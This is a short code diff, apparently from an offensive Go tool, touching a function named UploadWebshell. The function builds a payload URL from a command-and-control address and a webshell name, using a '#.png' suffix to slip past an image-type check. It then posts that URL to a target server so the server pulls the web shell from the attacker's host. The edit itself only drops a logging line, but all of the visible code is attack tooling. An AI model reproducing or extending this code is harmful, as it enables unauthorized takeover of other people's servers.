@@ -251,8 +251,6 @@ func (c *Client) UploadWebshell(c2addr string) (err error) {
 	payload = fmt.Sprintf("%s/%s#.png", c2addr, c.Webshellname)
 	postdata.Set("url", payload)
 
-	InfMsg(fmt.Sprintf("target url: %s", payload))
-
 	req, err = http.NewRequest(http.MethodPost, targeturl, strings.NewReader(postdata.Encode()))
 	if err != nil {
 		return err
